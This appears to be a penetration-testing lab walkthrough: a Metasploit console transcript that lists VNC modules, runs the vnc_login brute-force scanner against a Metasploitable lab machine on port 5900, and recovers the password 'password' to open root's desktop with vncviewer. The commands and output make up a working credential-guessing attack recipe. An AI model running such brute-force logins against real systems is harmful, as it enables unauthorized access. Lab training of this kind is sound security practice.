# Attacking on Port 5900

```
msf > search vnc
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                                 Disclosure Date  Rank       Description
   ----                                                 ---------------  ----       -----------
   auxiliary/admin/vnc/realvnc_41_bypass                2006-05-15       normal     RealVNC NULL Authentication Mode Bypass
   auxiliary/scanner/vnc/vnc_login                                       normal     VNC Authentication Scanner
   auxiliary/scanner/vnc/vnc_none_auth                                   normal     VNC Authentication None Detection
   auxiliary/server/capture/vnc                                          normal     Authentication Capture: VNC
   exploit/multi/misc/legend_bot_exec                   2015-04-27       excellent  Legend Perl IRC Bot Remote Code Execution
   exploit/multi/vnc/vnc_keyboard_exec                  2015-07-10       great      VNC Keyboard Remote Code Execution
   exploit/windows/vnc/realvnc_client                   2001-01-29       normal     RealVNC 3.3.7 Client Buffer Overflow
   exploit/windows/vnc/ultravnc_client                  2006-04-04       normal     UltraVNC 1.0.1 Client Buffer Overflow
   exploit/windows/vnc/ultravnc_viewer_bof              2008-02-06       normal     UltraVNC 1.0.2 Client (vncviewer.exe) Buffer Overflow
   exploit/windows/vnc/winvnc_http_get                  2001-01-29       average    WinVNC Web Server GET Overflow
   payload/windows/vncinject/bind_hidden_ipknock_tcp                     normal     VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager
   payload/windows/vncinject/bind_hidden_tcp                             normal     VNC Server (Reflective Injection), Hidden Bind TCP Stager
   payload/windows/vncinject/bind_ipv6_tcp                               normal     VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
   payload/windows/vncinject/bind_ipv6_tcp_uuid                          normal     VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
   payload/windows/vncinject/bind_nonx_tcp                               normal     VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)
   payload/windows/vncinject/bind_tcp                                    normal     VNC Server (Reflective Injection), Bind TCP Stager (Windows x86)
   payload/windows/vncinject/bind_tcp_rc4                                normal     VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   payload/windows/vncinject/bind_tcp_uuid                               normal     VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
   payload/windows/vncinject/find_tag                                    normal     VNC Server (Reflective Injection), Find Tag Ordinal Stager
   payload/windows/vncinject/reverse_hop_http                            normal     VNC Server (Reflective Injection), Reverse Hop HTTP/HTTPS Stager
   payload/windows/vncinject/reverse_http                                normal     VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet)
   payload/windows/vncinject/reverse_http_proxy_pstore                   normal     VNC Server (Reflective Injection), Reverse HTTP Stager Proxy
   payload/windows/vncinject/reverse_ipv6_tcp                            normal     VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)
   payload/windows/vncinject/reverse_nonx_tcp                            normal     VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)
   payload/windows/vncinject/reverse_ord_tcp                             normal     VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
   payload/windows/vncinject/reverse_tcp                                 normal     VNC Server (Reflective Injection), Reverse TCP Stager
   payload/windows/vncinject/reverse_tcp_allports                        normal     VNC Server (Reflective Injection), Reverse All-Port TCP Stager
   payload/windows/vncinject/reverse_tcp_dns                             normal     VNC Server (Reflective Injection), Reverse TCP Stager (DNS)
   payload/windows/vncinject/reverse_tcp_rc4                             normal     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   payload/windows/vncinject/reverse_tcp_rc4_dns                         normal     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/vncinject/reverse_tcp_uuid                            normal     VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support
   payload/windows/vncinject/reverse_winhttp                             normal     VNC Server (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
   payload/windows/x64/vncinject/bind_ipv6_tcp                           normal     Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager
   payload/windows/x64/vncinject/bind_ipv6_tcp_uuid                      normal     Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager with UUID Support
   payload/windows/x64/vncinject/bind_tcp                                normal     Windows x64 VNC Server (Reflective Injection), Windows x64 Bind TCP Stager
   payload/windows/x64/vncinject/bind_tcp_uuid                           normal     Windows x64 VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x64)
   payload/windows/x64/vncinject/reverse_http                            normal     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
   payload/windows/x64/vncinject/reverse_https                           normal     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
   payload/windows/x64/vncinject/reverse_tcp                             normal     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
   payload/windows/x64/vncinject/reverse_tcp_uuid                        normal     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
   payload/windows/x64/vncinject/reverse_winhttp                         normal     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
   payload/windows/x64/vncinject/reverse_winhttps                        normal     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
   post/multi/gather/remmina_creds                                       normal     UNIX Gather Remmina Credentials
   post/osx/gather/enum_chicken_vnc_profile                              normal     OS X Gather Chicken of the VNC Profile
   post/windows/gather/credentials/mremote                               normal     Windows Gather mRemote Saved Password Extraction
   post/windows/gather/credentials/vnc                                   normal     Windows Gather VNC Password Extraction


msf > use auxiliary/scanner/vnc/vnc_login
msf auxiliary(vnc_login) > show options

Module options (auxiliary/scanner/vnc/vnc_login):

   Name              Current Setting                                                   Required  Description
   ----              ---------------                                                   --------  -----------
   BLANK_PASSWORDS   false                                                             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                 yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                             no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                             no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                             no        Add all users in the current database to the list
   PASSWORD                                                                            no        The password to test
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt  no        File containing passwords, one per line
   Proxies                                                                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                  run                            yes       The target address range or CIDR identifier
   RPORT             5900                                                              yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                                             yes       Stop guessing when a credential works for a host
   THREADS           1                                                                 yes       The number of concurrent threads
   USERNAME          <BLANK>                                                           no        A specific username to authenticate as
   USERPASS_FILE                                                                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                             no        Try the username as the password for all users
   USER_FILE                                                                           no        File containing usernames, one per line
   VERBOSE           true                                                              yes       Whether to print output for all attempts

msf auxiliary(vnc_login) > set RHOSTS 192.168.56.10
RHOSTS => 192.168.56.10
msf auxiliary(vnc_login) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf auxiliary(vnc_login) > show options

Module options (auxiliary/scanner/vnc/vnc_login):

   Name              Current Setting                                                   Required  Description
   ----              ---------------                                                   --------  -----------
   BLANK_PASSWORDS   false                                                             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                 yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                             no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                             no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                             no        Add all users in the current database to the list
   PASSWORD                                                                            no        The password to test
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt  no        File containing passwords, one per line
   Proxies                                                                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            192.168.56.101                                                    yes       The target address range or CIDR identifier
   RPORT             5900                                                              yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                                             yes       Stop guessing when a credential works for a host
   THREADS           1                                                                 yes       The number of concurrent threads
   USERNAME          <BLANK>                                                           no        A specific username to authenticate as
   USERPASS_FILE                                                                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                             no        Try the username as the password for all users
   USER_FILE                                                                           no        File containing usernames, one per line
   VERBOSE           true                                                              yes       Whether to print output for all attempts

msf auxiliary(vnc_login) > run

[*] 192.168.56.101:5900   - 192.168.56.101:5900 - Starting VNC login sweep
[!] 192.168.56.101:5900   - No active DB -- Credential data will not be saved!
[+] 192.168.56.101:5900   - 192.168.56.101:5900 - Login Successful: :password
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf auxiliary(vnc_login) > vncviewer
[*] exec: vncviewer

Connected to RFB server, using protocol version 3.3
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (metasploitable:0)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0



```



